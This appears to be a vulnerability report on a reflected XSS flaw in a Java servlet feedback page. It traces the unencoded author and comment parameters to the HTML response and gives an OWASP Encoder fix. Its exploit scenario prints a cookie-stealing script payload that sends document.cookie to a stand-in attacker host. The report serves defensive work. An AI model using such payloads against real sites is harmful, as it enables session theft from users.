## Verdict

**EXPLOITABLE**

Cross-Site Scripting (CWE-79) vulnerability confirmed. Untrusted user input (`author` and `comment` request parameters) flows from `FeedbackController.handleSubmit()` to `FeedbackRenderer.renderConfirmation()` where it is concatenated directly into an HTML string and written to the response via `PrintWriter.println()` without any encoding. An attacker can inject JavaScript payloads via either parameter to execute arbitrary script in the victim's browser.

## Source

**Entry points**: `HttpServletRequest.getParameter("author")` and `HttpServletRequest.getParameter("comment")` in `FeedbackController.handleSubmit()` (lines 13, 17).

**Data flow**: Both parameters are assigned to `authorName` and `rawComment` (with null-safety defaults), passed to `FeedbackRenderer.FeedbackSubmission` constructor, and stored as instance fields. `FeedbackRenderer.renderConfirmation()` receives the submission object and directly embeds `submission.authorName` and `submission.comment` into an HTML string via string concatenation (lines 29-30 in FeedbackRenderer.java).

**Sink**: `out.println(html)` at line 36 of `FeedbackRenderer.java`, where `out` is `response.getWriter()`. The HTML string containing unencoded user input is written to the HTTP response as `text/html` content (line 33).

**Exploit scenario**: A request with `?author=<img src=x onerror=alert('XSS')>` or `?comment=<script>fetch('//attacker.com/steal?c='+document.cookie)</script>` causes the browser to execute the attacker's script in the context of the victim's session.

## Fix

Add the OWASP Java Encoder library (if not already present) and apply context-appropriate encoding at the sink:

**Dependency** (add to `pom.xml` or build configuration):
```
org.owasp.encoder:encoder:1.2.3
```

**Fixed code for `FeedbackRenderer.java`**:

```java
package com.example.feedback;

import org.owasp.encoder.Encode;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.time.Instant;
import java.util.logging.Logger;

public class FeedbackRenderer {

    private static final Logger LOG = Logger.getLogger(FeedbackRenderer.class.getName());

    public static class FeedbackSubmission {
        final String authorName;
        final String comment;
        final Instant submittedAt;

        FeedbackSubmission(String authorName, String comment, Instant submittedAt) {
            this.authorName = authorName;
            this.comment = comment;
            this.submittedAt = submittedAt;
        }
    }

    public void renderConfirmation(FeedbackSubmission submission, HttpServletResponse response) throws IOException {
        LOG.info("Feedback received at " + submission.submittedAt);

        String html = "<html><body>"
                + "<h1>Thanks for your feedback, " + Encode.forHtml(submission.authorName) + "!</h1>"
                + "<p>You said: " + Encode.forHtml(submission.comment) + "</p>"
                + "</body></html>";

        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println(html);
    }
}
```

The key change: wrap both `submission.authorName` and `submission.comment` with `Encode.forHtml()` at lines 29-30 before concatenation into the HTML string.

## Explanation

The vulnerability arises because user-supplied author name and comment text are embedded directly into an HTML string without output encoding. `Encode.forHtml()` from the OWASP Java Encoder performs entity encoding, converting special characters (`<`, `>`, `&`, `"`, `'`) to their HTML entity representations (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`). This ensures the browser treats the encoded string as literal text data rather than executable markup or script, preventing script injection.

This is the primary defence for CWE-79 in this context (HTML body content). The input validation in `FeedbackController` (defaulting null to "Anonymous" or empty string) does not prevent injection—it only ensures the value is not null. Encoding at the output sink is mandatory because the same values may be rendered into different contexts (attribute, script, URL), each requiring different encoding; applying a single encoding on input is insufficient.

## Behaviour changes

- **Output**: HTML special characters in user-provided author name and comment are now displayed as encoded entities (e.g., `<` becomes `&lt;`). Legitimate text containing `<`, `>`, `&`, or quotes will render with those characters escaped visually; this is correct and expected for text content in HTML body context.
- **Performance**: Minimal—only two additional method calls per response.
- **Dependencies**: Requires OWASP Java Encoder library (stable, well-maintained; use version 1.2.3 or later, confirmed via dependency scanner against known vulnerabilities in that library).
- **Backwards compatibility**: No API changes; response structure and status codes remain identical. Only the text content encoding changes.
